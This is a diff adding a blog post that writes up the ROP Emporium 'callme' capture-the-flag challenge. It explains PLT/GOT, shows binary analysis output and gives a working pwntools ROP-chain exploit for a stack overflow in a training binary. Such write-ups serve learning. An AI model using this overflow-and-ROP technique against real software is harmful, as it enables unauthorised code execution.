@@ -1,0 +1,286 @@
+<!doctype html>
+<html lang="en" data-scheme="river" data-schemes="river">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>ROP Emporium: callme · river</title>
+    <meta name="description" content="Chaining PLT calls with a multi-argument ROP gadget to invoke three functions in sequence">
+    <meta name="author" content="river">
+    <link rel="canonical" href="https://rivers.sh/posts/ropemporium-callme/">
+    <meta property="og:site_name" content="river">
+    <meta property="og:title" content="ROP Emporium: callme">
+    <meta property="og:description" content="Chaining PLT calls with a multi-argument ROP gadget to invoke three functions in sequence">
+    <meta property="og:url" content="https://rivers.sh/posts/ropemporium-callme/">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="/images/favicon.svg" type="image/svg+xml">
+    <link rel="alternate" type="application/atom+xml" title="river" href="/atom.xml">
+    <link rel="preload" href="/fonts/MesloLGS-Regular.ttf" as="font" type="font/ttf" crossorigin>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/syntax.css">
+    <script>
+    // Runs before first paint: restore the visitor's colour scheme and pick the
+    // background art, so neither flashes in after load.
+    (function () {
+      var d = document.documentElement;
+      try {
+        var s = localStorage.getItem("scheme");
+        if (s && d.getAttribute("data-schemes").split(" ").indexOf(s) !== -1) d.setAttribute("data-scheme", s);
+      } catch (e) {}
+      var art = ["/images/art/art1.jpg"];
+      if (!art.length) return;
+      var i = Math.floor(Math.random() * art.length);
+      try {
+        // don't show the same art twice in a row
+        var last = parseInt(localStorage.getItem("art-last"), 10);
+        if (art.length > 1 && i === last) i = (i + 1 + Math.floor(Math.random() * (art.length - 1))) % art.length;
+        localStorage.setItem("art-last", i);
+      } catch (e) {}
+      var a = typeof art[i] === "string" ? { src: art[i] } : art[i];
+      d.style.setProperty("--art", 'url("' + a.src + '")');
+      d.style.setProperty("--art-pos", a.position || "right bottom");
+      d.setAttribute("data-art", "");
+    })();
+    </script>
+</head>
+<body class="is-post">
+    <a class="skip-link" href="#main">skip to content</a>
+    <div class="page">
+        <header class="site-header">
+    <a class="site-title" href="/">river</a>
+    <nav class="site-nav" aria-label="site">
+        <ul><li><a href="/">home</a></li><li><a href="/blog/">blog</a></li><li><a href="/categories/">categories</a></li><li><a href="/tags/">tags</a></li><li><a href="/search/">search</a></li></ul>
+    </nav>
+</header>
+
+        <main id="main">
+<article class="post h-entry">
+    <header class="post-header">
+        <h1 class="post-title p-name">ROP Emporium: callme</h1>
+        <!-- no whitespace between items: the "|" separators supply the spacing -->
+        <div class="post-meta"><time class="dt-published" datetime="2026-01-28">Jan 28, 2026</time><span>4 min read</span><span class="post-cats"><a href="/categories/ctf/">CTF</a> › <a href="/categories/ctf/rop-emporium/">ROP Emporium</a></span><span class="post-tags"><a class="p-category" href="/tags/binary-exploitation/">#Binary Exploitation</a> <a class="p-category" href="/tags/rop/">#ROP</a> <a class="p-category" href="/tags/x86-64/">#x86-64</a> <a class="p-category" href="/tags/pwntools/">#pwntools</a> <a class="p-category" href="/tags/plt/">#PLT</a> <a class="p-category" href="/tags/got/">#GOT</a></span></div>
+        <p class="post-description p-summary">Chaining PLT calls with a multi-argument ROP gadget to invoke three functions in sequence</p>
+    </header>
+
+    
+    <details class="toc toc-inline">
+        <summary>contents</summary>
+        <nav aria-label="contents"><ol><li class="toc-h2"><a href="#challenge-info">challenge info</a></li><li class="toc-h2"><a href="#plt--got-explanation">PLT &amp; GOT explanation</a></li><li class="toc-h3"><a href="#example">example</a></li><li class="toc-h2"><a href="#methodology">methodology</a></li><li class="toc-h3"><a href="#pwnme-exploration">pwnme exploration</a></li><li class="toc-h2"><a href="#exploitation">exploitation</a></li></ol></nav>
+    </details>
+    
+
+    <div class="prose e-content" tabindex="-1">
+
+<h2 id="challenge-info"><a href="#challenge-info" class="anchor">#</a>challenge info</h2>
+<p>the challenge description already gives a ton of information by default;</p>
+<blockquote>
+<p>You must call the <code>callme_one()</code>, <code>callme_two()</code> and <code>callme_three()</code> functions in that order, each with the arguments <code>0xdeadbeef</code>, <code>0xcafebabe</code>, <code>0xd00df00d</code> e.g. <code>callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)</code> to print the flag. <strong>For the x86_64 binary</strong> double up those values, e.g. <code>callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</code></p>
+</blockquote>
+<p>additionally, it urges to learn about the PLT (procedure linking table)</p>
+<p>i'm assuming the <code>callme</code> functions look something like:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> callme_one<span class="op">(</span><span class="dt">long</span> arg1<span class="op">,</span> <span class="dt">long</span> arg2<span class="op">,</span> <span class="dt">long</span> arg3<span class="op">);</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> callme_two<span class="op">(</span><span class="dt">long</span> arg1<span class="op">,</span> <span class="dt">long</span> arg2<span class="op">,</span> <span class="dt">long</span> arg3<span class="op">);</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> callme_three<span class="op">(</span><span class="dt">long</span> arg1<span class="op">,</span> <span class="dt">long</span> arg2<span class="op">,</span> <span class="dt">long</span> arg3<span class="op">);</span></span></code></pre></div>
+<p>keep in mind the x64 calling convention:</p>
+<ol type="1">
+<li><code>rdi</code></li>
+<li><code>rsi</code></li>
+<li><code>rdx</code></li>
+<li><code>rcx</code></li>
+<li><code>r8</code></li>
+<li><code>r9</code></li>
+<li>7th+ argument -&gt; stack</li>
+</ol>
+<h2 id="plt--got-explanation"><a href="#plt--got-explanation" class="anchor">#</a>PLT &amp; GOT explanation</h2>
+<p>quick tldr:</p>
+<blockquote>
+<p>The <strong>Global Offset Table (GOT)</strong> and <strong>Procedure Linkage Table (PLT)</strong> are crucial mechanisms for dynamic linking in Linux binaries. They work together to enable efficient resolution of external function addresses at runtime.</p>
+</blockquote>
+<p>in practice, the PLT contains small stub functions for each external function, it's basically like a 'trampoline' of sorts for each external function</p>
+<p>the GOT, however, contains the actual runtime addresses of external functions. it initially points back to the PLT for lazy binding, and gets updated with real addresses after the first call (lazy binding- think lazy loading!)</p>
+<h3 id="example"><a href="#example" class="anchor">#</a>example</h3>
+<p>first call to <code>callme_one()</code>:</p>
+<ol type="1">
+<li>your code calls <code>callme_one@plt</code></li>
+<li>PLT jumps to address in <code>callme_one@got</code></li>
+<li>GOT initially points back to PLT resolver code</li>
+<li>resolver looks up real address &amp; updates GOT</li>
+<li>jumps to actual <code>callme_one()</code></li>
+</ol>
+<p>but, after this (subsequent calls):</p>
+<ol type="1">
+<li>your code calls <code>callme_one@plt</code></li>
+<li>PLT jumps to address in <code>callme_one@got</code></li>
+<li>GOT now has real address, jumps directly there</li>
+</ol>
+<p>for this challenge, we need to call three functions (<code>callme_one</code>, <code>callme_two</code>, <code>callme_three</code>) with specific args, so the PLT entries are my buddies because:</p>
+<ul>
+<li>PLT addresses don't change between runs (unlike the actual function addresses with ASLR)</li>
+<li>easy targets, since i can reliably jump to <code>callme_one@plt</code> in my ROP chain</li>
+<li>AND, i still get FULL FUNCTIONALITY! THAT'S RIGHT!!!! CALLING THE PLT ENTRY WORKS EXACTLY LIKE CALLING THE REAL FUNCTION!!!</li>
+</ul>
+<p><img src="/images/callme/Pasted%20image%2020260129152951.png" alt="PLT diagram" /></p>
+<h2 id="methodology"><a href="#methodology" class="anchor">#</a>methodology</h2>
+<div class="sourceCode" id="cb2"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> file callme</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">callme:</span> ELF 64-bit LSB executable, x86-64, version 1 <span class="er">(</span><span class="ex">SYSV</span><span class="kw">)</span><span class="ex">,</span> dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID<span class="pp">[</span><span class="ss">sha1</span><span class="pp">]</span>=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped</span></code></pre></div>
+<div class="sourceCode" id="cb3"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> checksec</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">File:</span>     /home/river/Desktop/cyber/ropemporium/callme/callme</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Arch:</span>     amd64</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="ex">RELRO:</span>      Partial RELRO</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Stack:</span>      No canary found</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="ex">NX:</span>         NX enabled</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="ex">PIE:</span>        No PIE <span class="er">(</span><span class="ex">0x400000</span><span class="kw">)</span></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="ex">RUNPATH:</span>    b<span class="st">&#39;.&#39;</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Stripped:</span>   No</span></code></pre></div>
+<p>the challenge description recommended we use rabin2, so i'll use that for once lol:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> rabin2 <span class="at">-i</span> callme</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">nth</span> vaddr      bind   type   lib name</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="ex">―――――――――――――――――――――――――――――――――――――</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="ex">1</span>   0x004006d0 GLOBAL FUNC       puts</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="ex">2</span>   0x004006e0 GLOBAL FUNC       printf</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="ex">3</span>   0x004006f0 GLOBAL FUNC       callme_three</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="ex">4</span>   0x00400700 GLOBAL FUNC       memset</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="ex">5</span>   0x00400710 GLOBAL FUNC       read</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="ex">6</span>   <span class="at">----------</span> GLOBAL FUNC       __libc_start_main</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="ex">7</span>   0x00400720 GLOBAL FUNC       callme_one</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="ex">8</span>   <span class="at">----------</span> WEAK   NOTYPE     __gmon_start__</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="ex">9</span>   0x00400730 GLOBAL FUNC       setvbuf</span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="ex">10</span>  0x00400740 GLOBAL FUNC       callme_two</span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a><span class="ex">11</span>  0x00400750 GLOBAL FUNC       exit</span></code></pre></div>
+<h3 id="pwnme-exploration"><a href="#pwnme-exploration" class="anchor">#</a>pwnme exploration</h3>
+<div class="sourceCode" id="cb5"><pre class="sourceCode asm"><code class="sourceCode fasm"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>pwndbg<span class="op">&gt;</span> disass pwnme</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>Dump of assembler code for function pwnme<span class="op">:</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>   0x0000000000400898 &lt;+0&gt;:	<span class="bu">push</span>   <span class="kw">rbp</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>   0x0000000000400899 &lt;+1&gt;:	<span class="bu">mov</span>    <span class="kw">rbp</span><span class="op">,</span><span class="kw">rsp</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>   0x000000000040089c &lt;+4&gt;:	<span class="bu">sub</span>    <span class="kw">rsp</span><span class="op">,</span><span class="bn">0x20</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>   0x00000000004008a0 &lt;+8&gt;:	<span class="bu">lea</span>    <span class="kw">rax</span><span class="op">,[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x20</span><span class="op">]</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>   0x00000000004008a4 &lt;+12&gt;:	<span class="bu">mov</span>    <span class="kw">edx</span><span class="op">,</span><span class="bn">0x20</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>   0x00000000004008a9 &lt;+17&gt;:	<span class="bu">mov</span>    <span class="kw">esi</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>   0x00000000004008ae &lt;+22&gt;:	<span class="bu">mov</span>    <span class="kw">rdi</span><span class="op">,</span><span class="kw">rax</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>   0x00000000004008b1 &lt;+25&gt;:	<span class="cf">call</span>   <span class="bn">0x400700</span> <span class="op">&lt;</span>memset<span class="fu">@</span><span class="er">p</span>lt<span class="op">&gt;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>   0x00000000004008b6 &lt;+30&gt;:	<span class="bu">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0x4009f0</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>   0x00000000004008bb &lt;+35&gt;:	<span class="cf">call</span>   <span class="bn">0x4006d0</span> <span class="op">&lt;</span>puts<span class="fu">@</span><span class="er">p</span>lt<span class="op">&gt;</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>   0x00000000004008c0 &lt;+40&gt;:	<span class="bu">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0x400a13</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>   0x00000000004008c5 &lt;+45&gt;:	<span class="bu">mov</span>    <span class="kw">eax</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>   0x00000000004008ca &lt;+50&gt;:	<span class="cf">call</span>   <span class="bn">0x4006e0</span> <span class="op">&lt;</span>printf<span class="fu">@</span><span class="er">p</span>lt<span class="op">&gt;</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a>   0x00000000004008cf &lt;+55&gt;:	<span class="bu">lea</span>    <span class="kw">rax</span><span class="op">,[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x20</span><span class="op">]</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>   0x00000000004008d3 &lt;+59&gt;:	<span class="bu">mov</span>    <span class="kw">edx</span><span class="op">,</span><span class="bn">0x200</span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>   0x00000000004008d8 &lt;+64&gt;:	<span class="bu">mov</span>    <span class="kw">rsi</span><span class="op">,</span><span class="kw">rax</span></span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a>   0x00000000004008db &lt;+67&gt;:	<span class="bu">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0x0</span></span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a>   0x00000000004008e0 &lt;+72&gt;:	<span class="cf">call</span>   <span class="bn">0x400710</span> <span class="op">&lt;</span>read<span class="fu">@</span><span class="er">p</span>lt<span class="op">&gt;</span></span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true" tabindex="-1"></a>   0x00000000004008e5 &lt;+77&gt;:	<span class="bu">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0x400a16</span></span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true" tabindex="-1"></a>   0x00000000004008ea &lt;+82&gt;:	<span class="cf">call</span>   <span class="bn">0x4006d0</span> <span class="op">&lt;</span>puts<span class="fu">@</span><span class="er">p</span>lt<span class="op">&gt;</span></span>
+<span id="cb5-23"><a href="#cb5-23" aria-hidden="true" tabindex="-1"></a>   0x00000000004008ef &lt;+87&gt;:	<span class="bu">nop</span></span>
+<span id="cb5-24"><a href="#cb5-24" aria-hidden="true" tabindex="-1"></a>   0x00000000004008f0 &lt;+88&gt;:	<span class="bu">leave</span></span>
+<span id="cb5-25"><a href="#cb5-25" aria-hidden="true" tabindex="-1"></a>   0x00000000004008f1 &lt;+89&gt;:	<span class="cf">ret</span></span>
+<span id="cb5-26"><a href="#cb5-26" aria-hidden="true" tabindex="-1"></a><span class="pp">End</span> of assembler dump<span class="op">.</span></span></code></pre></div>
+<p>vulnerable to bof:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode asm"><code class="sourceCode fasm"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>   0x00000000004008cf &lt;+55&gt;:	<span class="bu">lea</span>    <span class="kw">rax</span><span class="op">,[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x20</span><span class="op">]</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>   0x00000000004008d3 &lt;+59&gt;:	<span class="bu">mov</span>    <span class="kw">edx</span><span class="op">,</span><span class="bn">0x200</span></span></code></pre></div>
+<p>looks like it's setting up for a function call, maybe <code>read()</code> or <code>fgets()</code></p>
+<h2 id="exploitation"><a href="#exploitation" class="anchor">#</a>exploitation</h2>
+<p>alright so whenever i write my payloads i like to really modularize everything, i like having a section for relevant addresses, which i'll assign to variables, and i just overall prefer the neatness &amp; compartmentalization of pwn exploits like this</p>
+<p>tldr though, i ended up:</p>
+<ol type="1">
+<li>noting the addresses of <code>callme_one</code>, <code>callme_two</code>, and <code>callme_three</code>, which i did via rabin2 (as noted above)</li>
+<li>noting the values we'll have to change: <code>0xdeadbeefdeadbeef</code>, <code>0xcafebabecafebabe</code>, etc.</li>
+<li>writing the initial payload to overflow the vulnerable buffer which i found via the <code>lea</code> &amp; <code>mov</code> pattern, which was 40 bytes (32 byte buffer + 8 bytes for saved rbp = 40 bytes to reach RIP (return address))</li>
+<li>"new" part: using ropper to find the gadgets</li>
+</ol>
+<div class="sourceCode" id="cb7"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ropper <span class="at">--file</span> callme <span class="at">--search</span> <span class="st">&quot;pop rdi; pop rsi; pop rdx&quot;</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> Load gadgets for section: LOAD</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[LOAD]</span> loading... 100%</span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[LOAD]</span> removing double gadgets... 100%</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> Searching for gadgets: pop rdi<span class="kw">;</span> <span class="ex">pop</span> rsi<span class="kw">;</span> <span class="ex">pop</span> rdx</span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> File: callme</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x000000000040093c:</span> pop rdi<span class="kw">;</span> <span class="ex">pop</span> rsi<span class="kw">;</span> <span class="ex">pop</span> rdx<span class="kw">;</span> <span class="ex">ret</span><span class="kw">;</span></span></code></pre></div>
+<p>noted this address, and my payload ended up looking like:</p>
+<pre class="python3"><code>from pwn import *
+p = process(&#39;./callme&#39;)
+
+pop_rdi_rsi_rdx = p64(0x40093c)
+
+# addresses
+callme_one = p64(0x00400720)
+callme_two = p64(0x00400740)
+callme_three = p64(0x004006f0)
+
+# args
+arg1 = p64(0xdeadbeefdeadbeef)
+arg2 = p64(0xcafebabecafebabe)
+arg3 = p64(0xd00df00dd00df00d)
+
+payload = b&#39;A&#39;*40
+
+payload += pop_rdi_rsi_rdx + arg1 + arg2 + arg3 + callme_one
+payload += pop_rdi_rsi_rdx + arg1 + arg2 + arg3 + callme_two
+payload += pop_rdi_rsi_rdx + arg1 + arg2 + arg3 + callme_three
+
+p.sendline(payload)
+p.interactive()</code></pre>
+<p>why this works:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co"># The gadget executes:</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="co"># pop rdi    &lt;- pops arg1 from stack into rdi</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="co"># pop rsi    &lt;- pops arg2 from stack into rsi</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="co"># pop rdx    &lt;- pops arg3 from stack into rdx</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="co"># ret        &lt;- jumps to callme_one (next value on stack)</span></span></code></pre></div>
+<p>and all done!</p>
+<p>note: if that exact gadget had NOT existed, i would have had to find individual <code>pop</code> calls:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pop_rdi</span>   <span class="co"># 0x??????: pop rdi; ret</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">pop_rsi</span>   <span class="co"># 0x??????: pop rsi; ret</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="ex">pop_rdx</span>   <span class="co"># 0x??????: pop rdx; ret</span></span></code></pre></div>
+<p>and exploitation would have been more like:</p>
+<pre class="python3"><code>payload += pop_rdi_gadget
+payload += arg1
+payload += pop_rsi_gadget
+payload += arg2
+payload += pop_rdx_gadget
+payload += arg3
+payload += callme_one</code></pre>
+
+    </div>
+
+    <nav class="post-nav" aria-label="more posts">
+        <a class="prev" href="/posts/ropemporium-split/" rel="prev"><span class="post-nav-label">‹ older</span>ROP Emporium: split</a>
+        <a class="next" href="/posts/htb-facts/" rel="next"><span class="post-nav-label">newer ›</span>HackTheBox: Facts</a>
+    </nav>
+</article>
+
+<aside class="post-aside" aria-label="on this page">
+    <ul class="aside-actions">
+        <li><a href="/posts/ropemporium-split/" title="older: ROP Emporium: split" aria-label="older post">‹</a></li>
+        <li><a href="/posts/htb-facts/" title="newer: HackTheBox: Facts" aria-label="newer post">›</a></li>
+        <li><a href="#top" class="to-top" title="back to top" aria-label="back to top">↑</a></li>
+    </ul>
+    <nav class="toc toc-side" aria-label="contents"><ol><li class="toc-h2"><a href="#challenge-info">challenge info</a></li><li class="toc-h2"><a href="#plt--got-explanation">PLT &amp; GOT explanation</a></li><li class="toc-h3"><a href="#example">example</a></li><li class="toc-h2"><a href="#methodology">methodology</a></li><li class="toc-h3"><a href="#pwnme-exploration">pwnme exploration</a></li><li class="toc-h2"><a href="#exploitation">exploitation</a></li></ol></nav>
+</aside>
+
+        </main>
+        <footer class="site-footer">
+    <span class="footer-left">
+        <span>&copy; 2024–2026 river</span>
+        <button type="button" class="contact-button" aria-controls="toast" data-label="email" data-value="bG92ZS5yaXZlcnNAcHJvdG9uLm1l">email</button><button type="button" class="contact-button" aria-controls="toast" data-label="signal" data-value="cml2LjEzMzc=">signal</button>
+    </span>
+    <span class="footer-links">
+        <a href="/atom.xml">atom</a>
+        <button type="button" class="scheme-toggle" title="switch colour scheme">scheme: <span class="scheme-name">river</span></button>
+    </span>
+    <div class="toast" id="toast" role="status" aria-live="polite" hidden></div>
+</footer>
+
+    </div>
+    <script src="/js/main.js" defer></script>
+    
+    
+    <script>
+    // oneko chases the cursor, so skip it on touch screens
+    (function () {
+      if (!matchMedia("(hover: hover) and (pointer: fine)").matches) return;
+      var s = document.createElement("script");
+      s.src = "/js/oneko.js";
+      document.body.appendChild(s);
+    })();
+    </script>
+    
+</body>
+</html>
